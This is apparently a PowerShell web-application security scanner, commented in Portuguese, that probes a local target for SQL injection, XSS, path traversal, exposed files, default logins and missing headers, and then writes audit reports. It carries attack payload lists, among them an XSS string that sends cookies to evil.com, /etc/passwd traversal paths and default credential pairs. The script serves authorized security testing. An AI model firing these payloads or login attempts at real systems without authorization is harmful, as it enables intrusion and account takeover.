# =========================================
# ADVANCED SECURITY TESTING FRAMEWORK
# =========================================

#region Parameters
param(
    [Parameter(Mandatory = $false)]
    # CORREÇÃO: Usando 127.0.0.1 (IPv4 loopback) em vez de localhost para evitar problemas de resolução IPv6 (::1).
    [string]$TargetURL = "http://127.0.0.1:3000", 
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseURL = "http://localhost:54321",
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseKey,
    
    [Parameter(Mandatory = $false)]
    [string]$WordlistPath,
    
    [Parameter(Mandatory = $false)]
    [int]$MaxConcurrentRequests = 1,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipBruteForce,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipDOSCheck,
    
    [Parameter(Mandatory = $false)]
    [switch]$SaveResponses,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("Quick", "Standard", "Comprehensive")]
    [string]$ScanMode = "Standard",
    
    [Parameter(Mandatory = $false)]
    [string]$Proxy,
    
    [Parameter(Mandatory = $false)]
    [string]$CustomHeaders,
    
    [Parameter(Mandatory = $false)]
    [switch]$VerboseOutput
)

# Add required assemblies
Add-Type -AssemblyName System.Web
#endregion

#region Configuration
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Create session for connection reuse
$session = $null
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Security-Scanner/1.0"
}

if ($CustomHeaders) {
    $CustomHeaders.Split(";") | ForEach-Object {
        $keyValue = $_.Split("=")
        if ($keyValue.Count -eq 2) {
            $headers[$keyValue[0].Trim()] = $keyValue[1].Trim()
        }
    }
}

# Define scan intensity based on mode
$scanConfig = @{
    "Quick" = @{
        SQLiPayloads = 3
        XSSPayloads = 2
        DirectoryTests = 5
        PortChecks = 0
    }
    "Standard" = @{
        SQLiPayloads = 10
        XSSPayloads = 5
        DirectoryTests = 15
        PortChecks = 10
    }
    "Comprehensive" = @{
        SQLiPayloads = 25
        XSSPayloads = 15
        DirectoryTests = 50
        PortChecks = 20
    }
}

$config = $scanConfig[$ScanMode]

# Create output directory structure
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$hostname = ([System.Uri]$TargetURL).Host
$baseDir = Join-Path $PSScriptRoot "SecurityAudit_${hostname}_$timestamp"

$directories = @{
    Base = $baseDir
    Reports = Join-Path $baseDir "reports"
    Evidence = Join-Path $baseDir "evidence"
    Logs = Join-Path $baseDir "logs"
    Responses = Join-Path $baseDir "responses"
    Screenshots = Join-Path $baseDir "screenshots"
    Data = Join-Path $baseDir "data"
}

$directories.Values | ForEach-Object { 
    New-Item -ItemType Directory -Force -Path $_ | Out-Null 
}

# Log file
$logFile = Join-Path $directories.Logs "audit_$timestamp.log"
#endregion

#region Global Variables
$global:results = [System.Collections.ArrayList]@()
$global:vulnerabilities = [System.Collections.ArrayList]@()
$global:warnings = [System.Collections.ArrayList]@()
$global:informational = [System.Collections.ArrayList]@()
$global:evidence = [System.Collections.ArrayList]@()

$global:stats = @{
    TotalRequests = 0
    TotalTests = 0
    SuccessfulRequests = 0
    FailedRequests = 0
    StartTime = Get-Date
    ExecutionTime = [System.Diagnostics.Stopwatch]::StartNew()
}

$global:targetInfo = @{
    URL = $TargetURL
    Hostname = $hostname
    IPAddress = $null
    ServerHeaders = @()
    Technologies = @()
    OpenPorts = @()
}
#endregion

#region Logging Functions
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [switch]$Console
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    Add-Content -Path $logFile -Value $logMessage
    
    if ($Console -or $VerboseOutput) {
        $color = switch($Level) {
            "ERROR" { "Red" }
            "WARN" { "Yellow" }
            "INFO" { "Cyan" }
            "SUCCESS" { "Green" }
            "DEBUG" { "Gray" }
            default { "White" }
        }
        Write-Host $logMessage -ForegroundColor $color
    }
}

function Save-Evidence {
    param(
        [string]$Category,
        [string]$TestName,
        [string]$Description,
        [string]$Content,
        [string]$FileName
    )
    
    if ($SaveResponses -and $Content) {
        $evidenceFile = Join-Path $directories.Evidence $FileName
        $Content | Out-File -FilePath $evidenceFile -Encoding UTF8
        
        $evidenceItem = @{
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Category = $Category
            TestName = $TestName
            Description = $Description
            FilePath = $evidenceFile
        }
        $global:evidence.Add($evidenceItem) | Out-Null
        
        Write-Log "Evidence saved: $evidenceFile" -Level DEBUG
    }
}
#endregion

#region Core Functions
function Invoke-SafeRequest {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [string]$Body,
        [int]$TimeoutSec = 10,
        [switch]$ReturnResponse
    )
    
    $requestId = [Guid]::NewGuid().ToString("N").Substring(0,8)
    Write-Log "[REQ-$requestId] $Method $Uri" -Level DEBUG
    
    try {
        $params = @{
            Uri = $Uri
            Method = $Method
            TimeoutSec = $TimeoutSec
            UserAgent = $headers["User-Agent"]
            Headers = $Headers
            UseBasicParsing = $true
            SessionVariable = 'session'
        }
        
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = 'application/x-www-form-urlencoded'
        }
        
        if ($Proxy) {
            $params.Proxy = $Proxy
        }
        
        $response = Invoke-WebRequest @params -ErrorAction Stop
        $global:stats.TotalRequests++
        $global:stats.SuccessfulRequests++
        
        Write-Log "[REQ-$requestId] Status: $($response.StatusCode)" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $true
                Response = $response
                StatusCode = $response.StatusCode
                Headers = $response.Headers
                Content = $response.Content
                RawContent = $response.RawContent
            }
        }
        
        return @{ Success = $true; StatusCode = $response.StatusCode }
        
    } catch {
        $global:stats.TotalRequests++
        $global:stats.FailedRequests++
        
        $errorDetails = $_.Exception.Message
        Write-Log "[REQ-$requestId] Failed: $errorDetails" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $false
                Error = $errorDetails
                StatusCode = $null
            }
        }
        
        return @{ Success = $false; Error = $errorDetails }
    }
}

function Add-TestResult {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Category,
        
        [Parameter(Mandatory=$true)]
        [string]$TestName,
        
        [Parameter(Mandatory=$true)]
        [string]$Details,
        
        [Parameter(Mandatory=$true)]
        [ValidateSet("VULNERABLE", "WARNING", "SECURE", "INFO", "ERROR")]
        [string]$Status,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")]
        [string]$Severity = "INFO",
        
        [string]$Recommendation,
        [string]$CWE,
        [string]$Remediation,
        [object]$Evidence
    )
    
    $result = [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Category = $Category
        TestName = $TestName
        Details = $Details
        Status = $Status
        Severity = $Severity
        Recommendation = $Recommendation
        CWE = $CWE
        Remediation = $Remediation
        Evidence = $Evidence
    }
    
    $global:results.Add($result) | Out-Null
    $global:stats.TotalTests++
    
    switch ($Status) {
        "VULNERABLE" { $global:vulnerabilities.Add($result) | Out-Null }
        "WARNING" { $global:warnings.Add($result) | Out-Null }
        "INFO" { $global:informational.Add($result) | Out-Null }
    }
    
    # Console output
    $color = switch($Status) {
        "VULNERABLE" { 
            switch($Severity) {
                "CRITICAL" { "Red" }
                "HIGH" { "DarkRed" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkYellow" }
                default { "Red" }
            }
        }
        "WARNING" { "Yellow" }
        "SECURE" { "Green" }
        "INFO" { "Cyan" }
        "ERROR" { "Magenta" }
        default { "White" }
    }
    
    # Usa caracteres ASCII simples para evitar erro de encoding.
    $statusSymbol = switch($Status) {
        "VULNERABLE" { "x" } 
        "WARNING" { "!" }
        "SECURE" { "v" } 
        "INFO" { "i" }
        "ERROR" { "e" } 
        default { " " }
    }
    
    Write-Host "[$statusSymbol] " -NoNewline -ForegroundColor $color
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Host "$Category - ${TestName}: $Details" -ForegroundColor $color
    
    # Log to file
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Log "[$Status] $Category - ${TestName}: $Details" -Level $Status
}

function Test-Endpoint {
    param(
        [string]$Url,
        [string]$ExpectedStatus = "200",
        [string]$TestName = "Endpoint Check"
    )
    
    $result = Invoke-SafeRequest -Uri $Url -ReturnResponse
    if ($result.Success -and $result.StatusCode -eq $ExpectedStatus) {
        return $true, $result
    }
    return $false, $result
}
#endregion

#region Banner
Write-Host "`n" -NoNewline
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "#             SECURITY TESTING FRAMEWORK                   #" -ForegroundColor Cyan
Write-Host "#                   Advanced Edition                       #" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "`n"

Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "| Target:          $($TargetURL.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Scan Mode:       $($ScanMode.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Timestamp:       $((Get-Date -Format 'yyyy-MM-dd HH:mm:ss').PadRight(40)) |" -ForegroundColor Yellow
Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "`n"
#endregion

#region Phase 1: Reconnaissance
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 1: RECONNAISSANCE" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 1: Reconnaissance" -Console

# Get target IP
try {
    # Usando a URL para garantir que o hostname seja o correto (127.0.0.1 ou o que for passado)
    $ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Select-Object -First 1
    $global:targetInfo.IPAddress = $ipAddress.IPAddressToString
    Write-Log "Resolved $hostname to $($global:targetInfo.IPAddress)" -Console
} catch {
    Write-Log "Could not resolve hostname: $hostname" -Level WARN -Console
}

# Test basic connectivity
Write-Host "`n[1.1] Testing connectivity..." -ForegroundColor Gray
$connectivity = Test-Endpoint -Url $TargetURL -TestName "Initial Connectivity"
if ($connectivity[0]) {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is responding to requests" -Status "SECURE" -Severity "INFO"
} else {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is not reachable. Check if the server at $TargetURL is running." -Status "ERROR" -Severity "INFO"
    Write-Host "ERROR: Target is not reachable. Check if the server at $TargetURL is running. Exiting..." -ForegroundColor Red
    exit 1
}

# Get server headers and technology info
Write-Host "`n[1.2] Gathering server information..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $serverHeaders = $response.Response.Headers
    
    # Check for server headers
    $serverHeader = $serverHeaders["Server"]
    if ($serverHeader) {
        $global:targetInfo.ServerHeaders += $serverHeader
        Write-Log "Server header detected: $serverHeader" -Console
    }
    
    # Check common technology indicators
    $techIndicators = @{
        "X-Powered-By" = "Server Technology"
        "X-AspNet-Version" = "ASP.NET"
        "X-AspNetMvc-Version" = "ASP.NET MVC"
        "X-Generator" = "CMS/Framework"
        "X-Drupal-Cache" = "Drupal"
        "X-WP-Total" = "WordPress"
    }
    
    foreach ($indicator in $techIndicators.Keys) {
        if ($serverHeaders[$indicator]) {
            $tech = "$($techIndicators[$indicator]): $($serverHeaders[$indicator])"
            $global:targetInfo.Technologies += $tech
            Write-Log "Technology detected: $tech" -Console
        }
    }
    
    # Check response body for technology signatures
    $body = $response.Response.Content
    $techPatterns = @{
        "jquery" = "jQuery"
        "react" = "React"
        "vue" = "Vue.js"
        "angular" = "Angular"
        "wordpress" = "WordPress"
        "drupal" = "Drupal"
        "joomla" = "Joomla"
    }
    
    foreach ($pattern in $techPatterns.Keys) {
        if ($body -match $pattern) {
            $global:targetInfo.Technologies += $techPatterns[$pattern]
        }
    }
}
#endregion

#region Phase 2: Vulnerability Scanning
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 2: VULNERABILITY SCANNING" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 2: Vulnerability Scanning" -Console

# Test 1: Advanced SQL Injection
Write-Host "`n[2.1] Testing SQL Injection (Advanced)..." -ForegroundColor Gray
$sqliPayloads = @(
    # Basic injections
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    
    # Union based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Error based
    "' AND 1=CAST((SELECT @@version) AS INT)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Blind boolean
    "' AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--"
)
# Resto do código de teste SQLi
$sqliDetected = 0
$sqliEvidence = @()

foreach($payload in $sqliPayloads[0..($config.SQLiPayloads-1)]) {
    try {
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        
        # Test in URL parameters. /login is a known public route
        $url = "$TargetURL/login?email=$encoded&password=test"
        $result = Invoke-SafeRequest -Uri $url -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "sqli_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check for SQL error patterns
            $sqlErrors = @(
                "SQL", "mysql", "syntax", "ORA-", "PostgreSQL", "SQLite",
                "Microsoft.*ODBC", "Driver.*SQL", "Unclosed quotation mark",
                "Incorrect syntax", "divide by zero"
            )
            
            foreach ($error in $sqlErrors) {
                if ($content -match $error) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "SQL Error Detected"
                        Error = $error
                        EvidenceId = $evidenceId
                    }
                    
                    Save-Evidence -Category "SQLi" -TestName "Error Based" `
                        -Description "SQL error response" -Content $content `
                        -FileName "${evidenceId}.txt"
                    break
                }
            }
            
            # Check for time delays (blind SQLi)
            if ($payload -match "SLEEP|WAITFOR") {
                if ($result.Response.TimeToFirstByte -gt 4000) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "Time Based"
                        Delay = $result.Response.TimeToFirstByte
                        EvidenceId = $evidenceId
                    }
                }
            }
        }
    } catch {
        Write-Log "SQLi test failed: $($_.Exception.Message)" -Level DEBUG
    }
    
    # CORREÇÃO: Aumentar o atraso para 2 segundos para evitar o Rate Limiting (Erro 429)
    Start-Sleep -Seconds 2 
}

if($sqliDetected -gt 0) {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "$sqliDetected SQL injection patterns detected" `
        -Status "VULNERABLE" -Severity "CRITICAL" `
        -Recommendation "Use parameterized queries or prepared statements" `
        -CWE "CWE-89" `
        -Remediation "Implement input validation and use ORM frameworks with parameterized queries" `
        -Evidence $sqliEvidence
} else {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "No SQL injection vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue using parameterized queries"
}

# Test 2: Advanced XSS Testing
Write-Host "`n[2.2] Testing Cross-Site Scripting (Advanced)..." -ForegroundColor Gray
$xssPayloads = @(
    # Basic scripts
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # JavaScript URIs
    "javascript:alert('XSS')",
    "JaVaScRipT:alert('XSS')",
    
    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    
    # DOM based
    "<script>document.location='http://evil.com/?c='+document.cookie</script>"
)

$xssDetected = 0
$xssEvidence = @()

foreach($payload in $xssPayloads[0..($config.XSSPayloads-1)]) {
    try {
        # CORREÇÃO: Usar um caminho conhecido e um parâmetro plausível (Ex: /login é público)
        # Parâmetros de redirecionamento ou erro são alvos comuns para XSS.
        $testUrl = "$TargetURL/login?redirect=$payload"
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "xss_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check if payload is reflected without encoding
            $decodedPayload = [System.Web.HttpUtility]::HtmlDecode($payload)
            if ($content -match [regex]::Escape($decodedPayload)) {
                $xssDetected++
                $xssEvidence += @{
                    Payload = $payload
                    Type = "Reflected XSS"
                    Location = "URL Parameter"
                    EvidenceId = $evidenceId
                }
                
                Save-Evidence -Category "XSS" -TestName "Reflected" `
                    -Description "XSS payload reflection" -Content $content `
                    -FileName "${evidenceId}.txt"
            }
        }
    } catch {
        Write-Log "XSS test failed: $($_.Exception.Message)" -Level DEBUG
    }
    
    # CORREÇÃO: Aumentar o atraso para 2 segundos para evitar o Rate Limiting (Erro 429)
    Start-Sleep -Seconds 2
}

if($xssDetected -gt 0) {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "$xssDetected XSS vulnerabilities detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implement proper output encoding and Content Security Policy" `
        -CWE "CWE-79" `
        -Remediation "Use frameworks that auto-escape content and implement CSP headers" `
        -Evidence $xssEvidence
} else {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "No XSS vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue input validation and output encoding practices"
}

# Test 3: Directory Traversal
Write-Host "`n[2.3] Testing Directory Traversal..." -ForegroundColor Gray
$traversalPayloads = @(
    "../../../../etc/passwd",
    "..\..\..\..\windows\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

$traversalDetected = 0
foreach($payload in $traversalPayloads) {
    try {
        # CORREÇÃO: Usar um caminho mais realista para Path Traversal em APIs modernas
        $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
        $testUrl = "$TargetURL/api/file/download?path=$encodedPayload"
        
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        # Checking for common file contents (Linux /etc/passwd or Windows win.ini)
        if ($result.Success -and $result.Content -match "root:|\[fonts\]") {
            $traversalDetected++
        }
    } catch { 
        Write-Log "Traversal test failed: $($_.Exception.Message)" -Level DEBUG 
    }
    
    # CORREÇÃO: Aumentar o atraso para 2 segundos para evitar o Rate Limiting (Erro 429)
    Start-Sleep -Seconds 2
}

if($traversalDetected -gt 0) {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "Directory traversal vulnerability detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -CWE "CWE-22" `
        -Recommendation "Validate file paths and use allow lists"
} else {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "No directory traversal vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO"
}

# Test 4: Security Headers Check
Write-Host "`n[2.4] Testing Security Headers..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $headers = $response.Response.Headers
    # CORREÇÃO (Sintaxe): Adicionado o ponto e vírgula (;) para separar os pares chave=valor nas hashmaps internas
    $securityHeaders = @{
        "X-Content-Type-Options" = @{ Expected = "nosniff"; Description = "Prevents MIME type sniffing"; Severity = "MEDIUM" }
        "X-Frame-Options" = @{ Expected = "DENY"; Description = "Prevents clickjacking"; Severity = "MEDIUM" }
        "X-XSS-Protection" = @{ Expected = "1; mode=block"; Description = "Enables XSS filter"; Severity = "LOW" }
        "Content-Security-Policy" = @{ Expected = "*"; Description = "Defines content sources"; Severity = "HIGH" }
        "Strict-Transport-Security" = @{ Expected = "max-age=31536000; includeSubDomains"; Description = "Enforces HTTPS"; Severity = "HIGH" }
        "Referrer-Policy" = @{ Expected = "strict-origin-when-cross-origin"; Description = "Controls referrer information"; Severity = "LOW" }
    }
    
    $missingHeaders = @()
    foreach ($header in $securityHeaders.Keys) {
        if (-not $headers[$header]) {
            $missingHeaders += @{ 
                Header = $header 
                Description = $securityHeaders[$header].Description 
                Severity = $securityHeaders[$header].Severity 
            }
        }
    }
    
    if ($missingHeaders.Count -gt 0) {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "$($missingHeaders.Count) security headers missing" `
            -Status "WARNING" -Severity "MEDIUM" `
            -Recommendation "Implement missing security headers" `
            -Remediation "Add security headers to web server configuration" `
            -Evidence $missingHeaders
    } else {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "All recommended security headers present" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 5: Sensitive File Exposure
Write-Host "`n[2.5] Testing Sensitive File Exposure..." -ForegroundColor Gray
$sensitiveFiles = @(
    "/.env", "/.git/config", "/.htaccess", "/web.config", "/package.json", "/composer.json", 
    "/yarn.lock", "/package-lock.json", "/README.md", "/CHANGELOG.md", "/LICENSE", 
    "/robots.txt", "/sitemap.xml", "/admin", "/wp-admin", "/phpinfo.php", "/test.php", 
    "/debug.php"
)
$exposedFiles = @()
foreach ($file in $sensitiveFiles[0..($config.DirectoryTests-1)]) {
    try {
        $result = Test-Endpoint -Url "$TargetURL$file"
        if ($result[0]) {
            $exposedFiles += $file
            Write-Log "Sensitive file exposed: $file" -Level WARN
        }
    } catch {
        Write-Log "File check failed: $file" -Level DEBUG
    }
    
    # CORREÇÃO (Rate Limit): Adicionar um atraso de 2 segundos aqui para evitar 429.
    Start-Sleep -Seconds 2
}
if ($exposedFiles.Count -gt 0) {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "$($exposedFiles.Count) sensitive files exposed" `
        -Status "VULNERABLE" -Severity "MEDIUM" `
        -Recommendation "Restrict access to sensitive files" `
        -CWE "CWE-200" `
        -Remediation "Implement proper file permissions and web server restrictions" `
        -Evidence $exposedFiles
} else {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "No sensitive files exposed" `
        -Status "SECURE" -Severity "INFO"
}
#endregion

#region Phase 3: Authentication & Authorization
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 3: AUTHENTICATION & AUTHORIZATION" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 3: Authentication & Authorization" -Console

# Test 6: Default Credentials
if (-not $SkipBruteForce) {
    Write-Host "`n[3.1] Testing Default Credentials..." -ForegroundColor Gray
    $defaultCreds = @(
        @{email="admin@admin.com"; password="admin"},
        @{email="administrator@localhost"; password="administrator"},
        @{email="root@localhost"; password="root"},
        @{email="test@test.com"; password="test"},
        @{email="user@user.com"; password="user"}
    )
    
    if ($WordlistPath -and (Test-Path $WordlistPath)) {
        Write-Log "Loading custom wordlist from: $WordlistPath" -Console
        $customCreds = Get-Content $WordlistPath | ForEach-Object {
            $parts = $_ -split ":"
            if ($parts.Count -eq 2) {
                @{email=$parts[0]; password=$parts[1]}
            }
        }
        $defaultCreds += $customCreds
    }
    
    $credSuccess = 0
    $successfulCreds = @()
    
    foreach($cred in $defaultCreds) {
        try {
            if ($SupabaseKey) {
                $body = @{ 
                    email = $cred.email 
                    password = $cred.password 
                } | ConvertTo-Json
                
                $result = Invoke-SafeRequest -Uri "$SupabaseURL/auth/v1/token" -Method POST `
                    -Headers @{"apikey"=$SupabaseKey; "Content-Type"="application/json"} `
                    -Body $body -ReturnResponse
                
                if ($result.Success -and $result.StatusCode -eq 200) {
                    $credSuccess++
                    $successfulCreds += "$($cred.email):$($cred.password)"
                    Write-Log "Successful login with: $($cred.email)" -Level WARN
                }
            }
        } catch {
            Write-Log "Auth test failed: $($_.Exception.Message)" -Level DEBUG
        }
        
        # CORREÇÃO (Rate Limit): Aumentar o atraso para 2 segundos para evitar o Rate Limiting (Erro 429)
        Start-Sleep -Seconds 2
    }
    
    if($credSuccess -gt 0) {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "$credSuccess successful logins with default credentials" `
            -Status "VULNERABLE" -Severity "CRITICAL" `
            -Recommendation "Change all default credentials immediately" `
            -CWE "CWE-1392" `
            -Remediation "Implement strong password policies and remove default accounts" `
            -Evidence $successfulCreds
    } else {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "No default credentials found" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 7: Session Management
Write-Host "`n[3.2] Testing Session Management..." -ForegroundColor Gray
try {
    # Check for session cookies without secure flag
    $response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
    
    if ($response.Success) {
        $cookies = $response.Response.Headers["Set-Cookie"]
        $sessionIssues = @()
        
        if ($cookies) {
            if ($cookies -notmatch "Secure") {
                $sessionIssues += "Missing Secure flag"
            }
            if ($cookies -notmatch "HttpOnly") {
                $sessionIssues += "Missing HttpOnly flag"
            }
            if ($cookies -match "SameSite=None" -and $cookies -notmatch "Secure") {
                $sessionIssues += "SameSite=None without Secure flag"
            }
        }
        
        if ($sessionIssues.Count -gt 0) {
            Add-TestResult -Category "Session Management" -TestName "Cookie Flags" `
                -Details "Session cookie issues found: $($sessionIssues -join ', ')" `
                -Status "WARNING" -Severity "MEDIUM" `
                -Recommendation "Set Secure and HttpOnly flags on session cookies" `
                -CWE "CWE-614" `
                -Remediation "Configure web server/framework to set security flags on cookies" `
                -Evidence $sessionIssues
        } else {
            Add-TestResult -Category "Session Management" -TestName "Cookie Flags" `
                -Details "Session cookies appear to have secure flags set" `
                -Status "SECURE" -Severity "INFO"
        }
    }
} catch {
    Write-Log "Session management test failed: $($_.Exception.Message)" -Level DEBUG
}

# Test 8: Insecure Direct Object Reference (IDOR) - Basic Check
Write-Host "`n[3.3] Testing IDOR (Basic)..." -ForegroundColor Gray

# Definir um endpoint protegido conhecido do proxy.ts
$protectedEndpoint = "$TargetURL/tickets/1" 
$unprotectedEndpoint = "$TargetURL/tickets/2" 

$requestHeaders = $headers.Clone()

# 1. Testar acesso sem autenticação
$anonResult = Invoke-SafeRequest -Uri $protectedEndpoint -ReturnResponse
$anonStatus = $anonResult.StatusCode

# 2. Testar acesso a outro ID (simulando acesso não autorizado) - Requer um mecanismo de login bem-sucedido para ser preciso, mas faremos o teste anônimo como proxy.
if ($anonStatus -eq 200) {
    Add-TestResult -Category "Authorization" -TestName "IDOR/BOLA - Anonymous Access" `
        -Details "Acesso anônimo bem-sucedido ao endpoint protegido $protectedEndpoint" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implementar autenticação em todos os endpoints protegidos" `
        -CWE "CWE-285"
} elseif ($anonStatus -eq 404 -or $anonStatus -eq 500) {
    # Se retornar 404 ou 500, o endpoint pode não existir, ou o middleware está bloqueando.
    Add-TestResult -Category "Authorization" -TestName "IDOR/BOLA - Anonymous Access" `
        -Details "Endpoint protegido $protectedEndpoint retornou $anonStatus. O teste IDOR/BOLA não pode ser concluído sem autenticação, mas a rota parece protegida/inexistente." `
        -Status "INFO" -Severity "INFO"
} elseif ($anonStatus -match "401|403") {
    Add-TestResult -Category "Authorization" -TestName "IDOR/BOLA - Anonymous Access" `
        -Details "Acesso anônimo ao endpoint protegido $protectedEndpoint falhou com status $anonStatus (Autorização/Autenticação Requerida)" `
        -Status "SECURE" -Severity "INFO"
}

#endregion

#region Phase 4: Reporting
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 4: REPORTING & CLEANUP" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 4: Reporting & Cleanup" -Console

# Stop timer
$global:stats.ExecutionTime.Stop()
$global:stats.ExecutionTimeSeconds = [Math]::Round($global:stats.ExecutionTime.Elapsed.TotalSeconds, 2)

# Save Raw JSON data
$jsonReportPath = Join-Path $directories.Data "audit_results_$timestamp.json"
$global:results | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonReportPath -Encoding UTF8

# Save CSV data
$csvReportPath = Join-Path $directories.Reports "audit_results_$timestamp.csv"
$global:results | Select-Object Timestamp, Category, TestName, Status, Severity, Details, Recommendation, CWE | Export-Csv -Path $csvReportPath -NoTypeInformation -Encoding UTF8

# Generate HTML Report (Simplified Placeholder)
$htmlReportPath = Join-Path $directories.Reports "audit_report_$timestamp.html"
$htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit Report - $($hostname)</title>
    <style>
        body { font-family: sans-serif; line-height: 1.6; margin: 20px; }
        .header { background: #333; color: white; padding: 15px; text-align: center; }
        .summary, .results { margin-top: 20px; border: 1px solid #ccc; padding: 15px; }
        h2 { border-bottom: 2px solid #ccc; padding-bottom: 5px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .VULNERABLE { background-color: #ffdddd; color: #a94442; }
        .WARNING { background-color: #fcf8e3; color: #8a6d3b; }
        .SECURE { background-color: #dff0d8; color: #3c763d; }
        .ERROR { background-color: #eee; color: #000; }
        .CRITICAL { font-weight: bold; color: #cc0000; }
        .HIGH { font-weight: bold; color: #e74c3c; }
    </style>
</head>
<body>
